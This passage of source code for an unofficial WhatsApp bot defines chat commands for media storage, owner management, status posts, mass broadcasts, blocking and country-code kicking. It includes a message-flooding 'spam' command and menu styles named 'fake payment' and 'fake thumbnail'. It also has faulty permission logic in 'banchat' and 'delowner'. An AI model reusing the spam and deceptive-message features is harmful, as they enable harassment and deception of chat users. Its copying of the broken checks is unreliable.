  teksoooooo += `│\n└────────────⭓\n\n*Total: ${ApkXlicon.length} APKs*`;
  replygcxlicon(teksoooooo);
}
break;

case 'addpdf': {
  if (!XliconTheCreator) return XliconStickOwner();

  if (args.length < 1) return replygcxlicon('📄 What is the name of the pdf?');
  let teks = `${text}`;
  {
      if (DocXlicon.includes(teks)) return replygcxlicon("❌ This name is already in use");
      let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
      DocXlicon.push(teks);
      await fsx.copy(delb, `./ES_TEAMS-MEDIA/doc/${teks}.pdf`);
      fs.writeFileSync('./ES_TEAMS-MEDIA/database/doc.json', JSON.stringify(DocXlicon));
      fs.unlinkSync(delb);
      replygcxlicon(`✅ Successfully added PDF\nTo check type ${prefix}listpdf`);
  }
}
break;

case 'delpdf': {
  if (!XliconTheCreator) return XliconStickOwner();

  if (args.length < 1) return replygcxlicon('❌ Enter the name of the PDF to delete');
  let teks = `${text}`;
  {
      if (!DocXlicon.includes(teks)) return replygcxlicon("❌ This name does not exist in the database");
      let wanu = DocXlicon.indexOf(teks);
      DocXlicon.splice(wanu, 1);
      fs.writeFileSync('./ES_TEAMS-MEDIA/database/doc.json', JSON.stringify(DocXlicon));
      fs.unlinkSync(`./ES_TEAMS-MEDIA/doc/${teks}.pdf`);
      replygcxlicon(`✅ Successfully deleted PDF: ${teks}`);
  }
}
break;

case 'listpdf': {
  let teksoooo = '📄┌──⭓「 *PDF LIST* 」\n│\n';
  for (let x of DocXlicon) {
      teksoooo += `│📑 ${x}\n`;
  }
  teksoooo += `│\n└────────────⭓\n\n*Total: ${DocXlicon.length} PDFs*`;
  replygcxlicon(teksoooo);
}
break;

case 'addmsg': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (!m.quoted) return replygcxlicon('🔄 Please reply to the message you want to save in the database');
  if (!text) return replygcxlicon(`💡 Example: ${prefix + command} file name`);
  
  let msgs = global.db.database;
  if (text.toLowerCase() in msgs) return replygcxlicon(`❌ '${text}' is already registered in the message list`);
  
  msgs[text.toLowerCase()] = m.quoted;
  delete msgs[text.toLowerCase()].chat;
  
  replygcxlicon(`✅ Successfully added the message to the message list as '${text}'\nAccess it with ${prefix}getmsg ${text}\nView the list of messages with ${prefix}listmsg`);
}
break;

case 'delmsg': case 'deletemsg': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (!text) return replygcxlicon('❌ What is the name of the message you want to delete?');
  
  let msgs = global.db.database;
  if (text == 'allmsg') {
      global.db.database = {};
      replygcxlicon('🧹 Successfully deleted all messages from the message list');
  } else {
      if (!(text.toLowerCase() in msgs)) return replygcxlicon(`❌ '${text}' not found in the message list`);
      delete msgs[text.toLowerCase()];
      replygcxlicon(`✅ Successfully deleted '${text}' from the message list`);
  }
}
break;

case 'getmsg': {
  if (!text) return replygcxlicon(`💡 Example: ${prefix + command} file name\n\nYou can view the list of messages with ${prefix}listmsg`);
  
  let msgs = global.db.database;
  if (!(text.toLowerCase() in msgs)) return replygcxlicon(`❌ '${text}' not found in the message list`);
  
  await XliconBotInc.relayMessage(m.chat, msgs[text.toLowerCase()], {});
}
break;

case 'listmsg': {
  let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } });
  let teks = '📜「 *LIST DATABASE* 」\n\n';
  
  for (let i of seplit) {
      teks += `${setv} *Name:* ${i.nama}\n${setv} *Type:* ${getContentType(i.message)?.replace(/Message/i, '')}\n────────────────────────\n\n`;
  }
  
  replygcxlicon(teks);
}
break;


			case 'addowner':
    if (!XliconTheCreator) return XliconStickOwner();
    if (!args[0]) return replygcxlicon(`🔑 Use ${prefix + command} number\nExample: ${prefix + command} ${ownernumber}`);
    
    bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
    let ceknye = await XliconBotInc.onWhatsApp(bnnd);
    
    if (ceknye.length == 0) return replygcxlicon(`⚠️ Enter a valid and registered number on WhatsApp!!!`);
    
    owner.push(bnnd);
    fs.writeFileSync('./src/owner.json', JSON.stringify(owner));
    
    replygcxlicon(`✅ Number ${bnnd} has become an owner!!!`);
    break;

case 'delowner':
    if (!XliconTheCreator) return XliconStickOwner();
    if (!args[0]) return replygcxlicon(`❌ Use ${prefix + command} number\nExample: ${prefix + command} 916909137213`);
    
    ya = q.split("|")[0].replace(/[^0-9]/g, '');
    unp = owner.indexOf(ya);
    owner.splice(unp, 1);
    fs.writeFileSync('./src/owner.json', JSON.stringify(owner));
    
    replygcxlicon(`⚠️ The number ${ya} has been deleted from the owner list by the owner!!!`);
    break;

case 'listowner':
    let teks = '┌──⭓「 *List Owner* 」\n│\n';
    for (let x of owner) {
        teks += `│👑 ${x}\n`;
    }
    teks += `│\n└────────────⭓\n\n*Total Owners: ${owner.length}*`;
    
    replygcxlicon(teks);
    break;

case 'shutdown':
    if (!XliconTheCreator) return XliconStickOwner();
    replygcxlicon(`🔄 Restarting the bot. This will take a few seconds...`);
    
    await sleep(3000);
    process.exit();
    break;

			  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcxlicon(m.chat)
           }
          break


          case 'banchat': {
            if (!XliconTheCreator) {
                if (m.isGroup) {
                    const groupId = m.chat;
                    
                    try {
                        // Load the list of banned groups from the JSON file
                        let bannedGroups = require('./database/jid.json');
                        
                        // Check if the group is already banned
                        if (!bannedGroups.includes(groupId)) {
                            // Add the group ID to the list of banned groups
                            bannedGroups.push(groupId);
                            
                            // Save the updated list to the JSON file
                            const fs = require('fs');
                            fs.writeFileSync('./database/jid.json', JSON.stringify(bannedGroups, null, 2));
                            
                            // Notify the group that it has been banned
                            replygcxlicon(`🚫 This chat has been banned from using the bot.`);
                            
                            // Leave the group
                            await XliconBotInc.groupLeave(groupId);
                            replygcxlicon(`👋 The bot has left the group.`);
                        } else {
                            replygcxlicon(`⚠️ This chat is already banned.`);
                        }
                    } catch (error) {
                        console.error(error);
                        replygcxlicon(`❌ An error occurred while banning this chat.`);
                    }
                } else {
                    replygcxlicon(`⚠️ This command can only be used in a group chat.`);
                }
            } else {
                replygcxlicon(`❌ Only the bot owner can use this command.`);
            }
        }
        break;
          
           



        case 'getexif': case 'getwm': case 'getwatermark': {
          if (!XliconTheCreator) return XliconStickOwner()
          replygcxlicon(`*Water Mark/Exif of ${botname} is* 🖼️\n\n${setv} 📦 Packname : ${packname}\n${setv} ✒️ Author : ${author}`)
      }
      break
      
      case 'getautoblocknumber': case 'getautoblockno': case 'getautoblock': {
          if (!XliconTheCreator) return XliconStickOwner()
          replygcxlicon(`*Auto Block Country Code of ${botname} is* 🌍\n\n${setv} 🇺🇳 Country Code : ${autoblocknumber}\n\n_Note: Once autoblock number is activated, numbers related to this country code will be blocked automatically_ 🚫`)
      }
      break
      
      case 'getantiforeign': case 'getantiforeignno': case 'getantiforeignnumber': {
          if (!XliconTheCreator) return XliconStickOwner()
          replygcxlicon(`*Anti Foreign Country Code of ${botname} is* 🛡️\n\n${setv} 🌏 Country Code : ${antiforeignnumber}\n\n_Note: Once antiforeign number is activated in any group chat, only members related to this country code are allowed to stay in the group chat, others will be kicked immediately, if chatted._ ❌`)
      }
      break
      
      case 'setexif': case 'setwm': {
          if (!XliconTheCreator) return XliconStickOwner()
          if (!text) return replygcxlicon(`Example : ${prefix + command} packname|author 💡`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcxlicon(`Exif successfully changed to ✅\n\n• 📦 Packname : ${global.packname}\n• ✒️ Author : ${global.author}`)
      }
      break
      
      case 'creategc': case 'creategroup': {
          if (!XliconTheCreator) return XliconStickOwner()
          if (!args.join(" ")) return replygcxlicon(`Use ${prefix + command} groupname ✍️`)
          try {
              let cret = await XliconBotInc.groupCreate(args.join(" "), [])
              let response = await XliconBotInc.groupInviteCode(cret.id)
              const teksop = `     「 Create Group 」 🏗️
      
      ▸ 🏷️ Name : ${cret.subject}
      ▸ 👤 Owner : @${cret.owner.split("@")[0]}
      ▸ 📅 Creation : ${moment(cret.creation * 1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}
      
      🔗 https://chat.whatsapp.com/${response}`
              XliconBotInc.sendMessage(m.chat, { text: teksop, mentions: await XliconBotInc.parseMention(teksop)}, {quoted: m})
          } catch {
              replygcxlicon(`Error ⚠️`)
          }
      }
      break
      
      case 'resetuser': case 'resetdbuser': {
          if (!XliconTheCreator) return XliconStickOwner()
          let totalusernya = db.users[0]
          replygcxlicon(`Successfully Deleted ${totalusernya} Users in Database 🗑️`)
          db.users = []
      }
      break
      
      case 'resethit': case 'resettotalhit': {
          if (!XliconTheCreator) return XliconStickOwner()
          global.db.settings[botNumber].totalhit = 0
          replygcxlicon(`Done! ✅`)
      }
      break
      
      case 'setreply': {
          if (!XliconTheCreator) return XliconStickOwner()
          if (!text) return replygcxlicon(`There are 4 reply options (v1, v2, v3, v4) 📬\nPlease select one.\nExample: ${prefix + command} v1 💭`)
      
          // Handle button responses
          if (text.startsWith('v')) {
              typereply = text;  // Set the selected reply option
      
              // Map button IDs to reply text
              const buttonTextMap = {
                  [`${prefix + command} v1`]: "📝 QUOTED NORMALLY",
                  [`${prefix + command} v2`]: "🔗 LINK + FAKE THUMBNAIL",
                  [`${prefix + command} v3`]: "📎 LARGE LINK + THUMBNAIL",
                  [`${prefix + command} v4`]: "📡 CHANNEL + LINK THUMB"
              };
      
              // Check if the selected reply is valid
              if (buttonTextMap[text]) {
                  return replygcxlicon(`You selected: ${buttonTextMap[text]} ✔️`);
              } else {
                  return replygcxlicon("Invalid reply option selected. ❌");
              }
          } else {
              return replygcxlicon(`There are 4 reply options (v1, v2, v3, v4) 📬\nPlease select one.\nExample: ${prefix + command} v1 💭`);
          }
          break;
      }
      
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!XliconTheCreator) return XliconStickOwner()
               if (!q) return replygcxlicon('Text?')
               await XliconBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.users) })
               replygcxlicon(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!XliconTheCreator) return XliconStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                  await XliconBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users) })
                  await replygcxlicon(mess.done)
               } else {
                  replygcxlicon('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!XliconTheCreator) return XliconStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                  await XliconBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users)})
                  await replygcxlicon(mess.done)
               } else {
                  replygcxlicon('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!XliconTheCreator) return XliconStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                  await XliconBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.users)
                  })
                  await replygcxlicon(mess.done)
               } else {
                  replygcxlicon('Reply to audio')
               }
            }
            break
            case 'setvidmenu':
              case 'svm':
              case 'setvgifmenu':
              case 'sgm': {
                  if (!XliconTheCreator) return XliconStickOwner()
                  try {
                      let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                      await fsx.copy(delb, './ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4')
                      fs.unlinkSync(delb)
                      replygcxlicon(`Done! 🎉 Video menu successfully set! 🎬`)
                  } catch {
                      replygcxlicon(`Please reply to a video with caption ${prefix + command} 🎥`)
                  }
              }
              break
              
              case 'setimgmenu':
              case 'sim': {
                  if (!XliconTheCreator) return XliconStickOwner()
                  try {
                      let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                      await fsx.copy(delb, './ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg')
                      fs.unlinkSync(delb)
                      replygcxlicon(`Done! 🎉 Image menu successfully set! 🖼️`)
                  } catch {
                      replygcxlicon(`Please reply to an image with caption ${prefix + command} 📸`)
                  }
              }
              break
              
              case 'setmenu': {
                  if (!XliconTheCreator) return XliconStickOwner()
              
                  // Check if the input starts with 'v' and set the menu accordingly
                  if (text.startsWith('v')) {
                      typemenu = text;  // Set the selected menu type
                      return replygcxlicon(`Successfully set menu to: ${text} ✅`);  // Notify the user
                  } else {
                      // If the input is not valid, show the available menu options
                      return replygcxlicon(`
                          Please select a menu option by specifying 'v' followed by the choice 📋.
              
                          Available menu options:
                          - v12: BUTTON + CHANNEL V2 📱 + 📺
                          - v11: BUTTON + CHANNEL 📱 + 📺
                          - v10: ONLY BUTTON 🔘
                          - v9: CHANNEL + FAKE THUMBNAIL V2 📺 + 🖼️
                          - v8: CHANNEL + FAKE THUMBNAIL 📺 + 🖼️
                          - v7: FAKE THUMBNAIL + DOCUMENT 🖼️ + 📄
                          - v6: FAKE PAYMENT 💳
                          - v5: CALL SCHEDULE 📞📅
                          - v4: GIF THUMBNAIL 🎞️
                          - v3: VIDEO THUMBNAIL 🎥🖼️
                          - v2: CHANNEL + THUMBNAIL 📺 + 🖼️
                          - v1: IMAGE THUMBNAIL 🖼️
              
                          Example: ${prefix + command} v1
                      `);
                  }
                  break;
              }
              
			case 'bc':
            case 'broadcast': {
               if (!XliconTheCreator) return XliconStickOwner()
               if (!text) return replygcxlicon('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await XliconBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await XliconBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await XliconBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcxlicon(`Success ${command} To ${Object.keys(global.db.users).length} Users`)
            }
            break
            case 'bcgc':
            case 'bcgroup': {
                if (!XliconTheCreator) return XliconStickOwner()
                if (!text) return replygcxlicon(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await XliconBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxlicon(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    XliconBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxlicon(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'spam':
              if (!XliconTheCreator) return XliconStickOwner()
              if (!text) return replygcxlicon(`Use ${prefix + command} text|amount 📝`)
              
              xliconarg = text.split("|")
              if (!xliconarg) return replygcxlicon(`Use ${prefix + command} text|amount 📝`)
              
              if (Number(xliconarg[1]) >= 50) return replygcxlicon('Max 50! 🚫')
              
              if (isNaN(xliconarg[1])) return replygcxlicon(`The amount must be a number 🔢`)
          
              // Send the message multiple times
              for (let i = 0; i < xliconarg[1]; i++) {
                  XliconBotInc.sendMessage(m.chat, {text: xliconarg[0]})
              }
          
              replygcxlicon(`Successfully sent ${xliconarg[1]} messages ✉️!`)
              break
          
			case 'antiforeign': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    // Check the command argument for enabling or disabling the feature
    if (args[0] === 'on') {
        db.groups[m.chat].antiforeignnum = true;
        return replygcxlicon(`${command} is enabled.`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antiforeignnum = false;
        return replygcxlicon(`${command} is disabled.`);
    } else {
        // Show message with options when invalid argument is provided
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable ${command}
            - ${prefix + command} off : Disable ${command}

            Example: ${prefix + command} on
        `);
    }
    break;
}


            case 'poll': {
	if (!XliconTheCreator) return XliconStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcxlicon(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xlicon,Cheems,Doge...`
                )
            try {
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await XliconBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
            } catch {
            	replygcxlicon(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xlicon,Cheems,Doge...`
                )
                }
        }
        break
			case 'autoblock':
    if (!XliconTheCreator) return XliconStickOwner();
    
    if (q == 'on') {
        db.settings[botNumber].autoblocknum = true;
        return replygcxlicon(`Successfully changed Auto-Block to ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].autoblocknum = false;
        return replygcxlicon(`Successfully changed Auto-Block to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Auto-Block
            - ${prefix + command} off : Disable Auto-Block

            Example: ${prefix + command} on
        `);
    }
    break;

case 'onlygroup':
case 'onlygc':
    if (!XliconTheCreator) return XliconStickOwner();
    
    if (q == 'on') {
        db.settings[botNumber].onlygrub = true;
        return replygcxlicon(`Successfully changed Onlygroup to ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].onlygrub = false;
        return replygcxlicon(`Successfully changed Onlygroup to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Onlygroup
            - ${prefix + command} off : Disable Onlygroup

            Example: ${prefix + command} on
        `);
    }
    break;

        case 'onlyprivatechat':
case 'onlypc':
    if (!XliconTheCreator) return XliconStickOwner();
    if (q == 'on') {
        db.settings[botNumber].onlypc = true;
        replygcxlicon(`Successfully Changed Only-Pc To ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].onlypc = false;
        replygcxlicon(`Successfully Changed Only-Pc To ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Only-Pc
            - ${prefix + command} off : Disable Only-Pc

            Example: ${prefix + command} on
        `);
    }
    break;

case 'onlyindia':
case 'onlyindianumber':
    if (!XliconTheCreator) return XliconStickOwner();
    if (q == 'on') {
        db.settings[botNumber].onlyindia = true;
        replygcxlicon(`Successfully Changed Only-Indian To ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].onlyindia = false;
        replygcxlicon(`Successfully Changed Only-Indian To ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Only-Indian
            - ${prefix + command} off : Disable Only-Indian

            Example: ${prefix + command} on
        `);
    }
    break;

case 'onlyindo':
case 'onlyindonumber':
    if (!XliconTheCreator) return XliconStickOwner();
    if (q == 'on') {
        db.settings[botNumber].onlyindo = true;
        replygcxlicon(`Successfully Changed Only-Indonesian To ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].onlyindo = false;
        replygcxlicon(`Successfully Changed Only-Indonesian To ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Only-Indonesian
            - ${prefix + command} off : Disable Only-Indonesian

            Example: ${prefix + command} on
        `);
    }
    break;

case 'setautoblock':
    if (!XliconTheCreator) return XliconStickOwner();
    if (!text) return replygcxlicon(`Example : ${prefix + command} 92`);
    global.autoblocknumber = text;
    replygcxlicon(`Auto-Block number successfully changed to ${text}`);
    break;

case 'setantiforeign':
    if (!XliconTheCreator) return XliconStickOwner();
    if (!text) return replygcxlicon(`Example : ${prefix + command} 91`);
    global.antiforeignnumber = text;
    replygcxlicon(`Anti-foreign number successfully changed to ${text}`);
    break;

case 'autoswview':
case 'autostatusview':
    if (!XliconTheCreator) return XliconStickOwner();
    if (args[0] === 'on') {
        db.settings[botNumber].antiswview = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.settings[botNumber].antiswview = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable ${command}
            - ${prefix + command} off : Disable ${command}

            Example: ${prefix + command} on
        `);
    }
    break;

case 'anticall':
    if (!XliconTheCreator) return XliconStickOwner();
    if (args[0] === 'on') {
        db.settings[botNumber].anticall = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.settings[botNumber].anticall = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Anti-Call
            - ${prefix + command} off : Disable Anti-Call

            Example: ${prefix + command} on
        `);
    }
    break;

case 'autorecordtype':
    if (!XliconTheCreator) return XliconStickOwner();
    if (q === 'on') {
        db.settings[botNumber].autorecordtype = true;
        replygcxlicon(`Successfully changed Auto-RecordingTyping to ${q}`);
    } else if (q === 'off') {
        db.settings[botNumber].autorecordtype = false;
        replygcxlicon(`Successfully changed Auto-RecordingTyping to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Auto-RecordingTyping
            - ${prefix + command} off : Disable Auto-RecordingTyping

            Example: ${prefix + command} on
        `);
    }
    break;

case 'autorecord':
    if (!XliconTheCreator) return XliconStickOwner();
    if (q === 'on') {
        db.settings[botNumber].autorecord = true;
        replygcxlicon(`Successfully changed Auto-Recording to ${q}`);
    } else if (q === 'off') {
        db.settings[botNumber].autorecord = false;
        replygcxlicon(`Successfully changed Auto-Recording to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Auto-Recording
            - ${prefix + command} off : Disable Auto-Recording

            Example: ${prefix + command} on
        `);
    }
    break;

        
case 'autotype':
    if (!XliconTheCreator) return XliconStickOwner();

    if (q === 'on') {
        db.settings[botNumber].autotype = true;
        return replygcxlicon(`Successfully changed Auto-Typing to ${q}`);
    } else if (q === 'off') {
        db.settings[botNumber].autotype = false;
        return replygcxlicon(`Successfully changed Auto-Typing to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Auto-Typing
            - ${prefix + command} off : Disable Auto-Typing

            Example: ${prefix + command} on
        `);
    }
    break;

case 'autoread':
    if (!XliconTheCreator) return XliconStickOwner();

    if (q === 'on') {
        db.settings[botNumber].autoread = true;
        return replygcxlicon(`Successfully changed Auto-Read to ${q}`);
    } else if (q === 'off') {
        db.settings[botNumber].autoread = false;
        return replygcxlicon(`Successfully changed Auto-Read to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Auto-Read
            - ${prefix + command} off : Disable Auto-Read

            Example: ${prefix + command} on
        `);
    }
    break;

case 'autobio':
    if (!XliconTheCreator) return XliconStickOwner();

    if (q == 'on') {
        db.settings[botNumber].autobio = true;
        return replygcxlicon(`Successfully changed AutoBio to ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].autobio = false;
        return replygcxlicon(`Successfully changed AutoBio to ${q}`);
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable AutoBio
            - ${prefix + command} off : Disable AutoBio

            Example: ${prefix + command} on
        `);
    }
    break;

        
			case 'self': case 'public': case 'mode': {
    if (!XliconTheCreator) return XliconStickOwner();

    // Check if the command is to toggle on or off directly
    if (q == 'on') {
        XliconBotInc.public = true;
        replygcxlicon('*Successfully changed to Public Usage*');
    } else if (q == 'off') {
        XliconBotInc.public = false;
        replygcxlicon('*Successfully changed to Self Usage*');
    } else {
        // Send a direct message indicating the change
        replygcxlicon('Please specify the mode you want to switch to:\n- `on` for Public Usage\n- `off` for Self Usage');
    }
}
break;

			case 'setbio': case 'setbotbio': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text) return replygcxlicon(`Where's the text??`)
				XliconBotInc.setStatus(q)
				replygcxlicon(`*Bio has been changed to ${q}*`)
			}
			break


			case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!XliconTheCreator) return XliconStickOwner()
                if (!quoted) return replygcxlicon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxlicon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxlicon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XliconBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XliconBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxlicon(mess.done)
                } else {
                    var memeg = await XliconBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxlicon(mess.done)
                }
                break
			case 'join': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text) return replygcxlicon('Enter Group Link!')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxlicon('Link Invalid!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				XliconStickWait()
				await XliconBotInc.groupAcceptInvite(result).catch((res) => {
					if (res.data == 400) return replygcxlicon('Group Not Found❗');
					if (res.data == 401) return replygcxlicon('Bot Kicked From The Group❗');
					if (res.data == 409) return replygcxlicon('Bots Have Joined the Group❗');
					if (res.data == 410) return replygcxlicon('Group URL Has Been Reset❗');
					if (res.data == 500) return replygcxlicon('Full Group❗');
				})
			}
			break
			case 'leave': case 'leavegc': {
				if (!XliconTheCreator) return XliconStickOwner()
				await XliconBotInc.groupLeave(m.chat).then((res) => replygcxlicon(jsonformat(res))).catch((err) => replygcxlicon(jsonformat(err)))
			}
			break
			case 'blokir': case 'block': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text && !m.quoted) {
					replygcxlicon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await XliconBotInc.updateBlockStatus(numbersOnly, 'block').then((a) => replygcxlicon(mess.done)).catch((err) => replygcxlicon('Fail!'))
				}
			}
			break
			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text && !m.quoted) {
					replygcxlicon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await XliconBotInc.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygcxlicon(mess.done)).catch((err) => replygcxlicon('Fail!'))
				}
			}
			break
			case 'listpc': {
				if (!XliconTheCreator) return XliconStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName
					teks += `${setv} *Name :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
				}
				XliconBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'listgc': {
				if (!XliconTheCreator) return XliconStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
				for (let i of anu) {
					let metadata = await XliconBotInc.groupMetadata(i)
					teks += `${setv} *Name :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n${setv} *ID :* ${metadata.id}\n${setv} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Karachi').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Member :* ${metadata.participants.length}\n\n=====================\n\n`
				}
				XliconBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'creategc': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text) return replygcxlicon(`Example:\n${prefix + command} *Gc Name*`)
				let group = await XliconBotInc.groupCreate(q, [m.sender])
				let res = await XliconBotInc.groupInviteCode(group.id)
				await XliconBotInc.sendMessage(m.chat, { text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Group Name :* *${q}*`, detectLink: true }, { quoted: m });
				await XliconBotInc.groupParticipantsUpdate(group.id, [m.sender], 'promote')
